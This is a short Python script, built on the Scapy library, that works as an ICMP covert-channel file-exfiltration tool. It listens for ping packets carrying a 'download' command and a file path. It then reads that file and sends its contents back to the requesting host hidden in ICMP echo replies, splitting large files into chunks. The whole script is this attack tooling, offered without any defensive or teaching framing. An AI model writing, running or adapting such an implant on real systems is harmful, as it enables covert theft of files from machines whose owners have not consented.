from scapy.all import *
from time import sleep

chunk_size_limit = 1000

x = 0
while x < 1:
    print(x)
    pkts = sniff(filter="icmp", count=1)

    for packet in pkts:
        # if  str(packet.getlayer(ICMP).type) == "8": 
            # print(packet[IP].src)
            print("Packet Type: " + str(packet[ICMP].type))
            print("Packet Src : " + str(packet[IP].src))
            print("Packet Data: " + str(packet[Raw].load))

            payload = str(packet[Raw].load)[2:-1].split("\\xc3\\xab")
            sleep(1)

            if(payload[0] == "download"and len(payload) == 2):
                print("Downloading file " + str(payload[1]))
                with open(str(payload[1]), "rb") as file:
                    data = file.read()
                    file.close()
                if(len(data) <= chunk_size_limit):
                    print("Sending single packet")
                    rtrn_packet = IP(dst=str(packet[IP].src))/ICMP(type=0)/(b'0\\xc3\\xab' + data)
                    print(rtrn_packet)
                    send(rtrn_packet)
                else:
                    print("Sending many packets")
                    n = chunk_size_limit
                    data_arr = [data[i:i+n] for i in range(0, len(data), n)]
                    print(data_arr)
                    init_packet = IP(dst=str(packet[IP].src))/ICMP(type=0)/(b'1\\xc3\\xab' + bytes(str(int((float(len(data)) / chunk_size_limit) + 1)).encode("utf-8")))
                    print("Init packet sent with data: " + str(init_packet[Raw].load))
                    send(init_packet)

                    for i in range(0,int((float(len(data)) / chunk_size_limit) + 1)):
                        new_pkts = sniff(filter="icmp and host " + str(packet[IP].src), count = 1, timeout=10)

                        for new_packet in new_pkts:
                            sleep(1)
                            send(IP(dst=str(packet[IP].src))/ICMP(type=0)/(data_arr[i]))

                        i += 1

            print(payload)

            # sleep(3)

            # rtrn_packet = IP(dst=str(packet[IP].src))/ICMP(type=0)/(b'This is a reply packet for pingback')
            # print(rtrn_packet)
            # send(rtrn_packet)

    x += 1
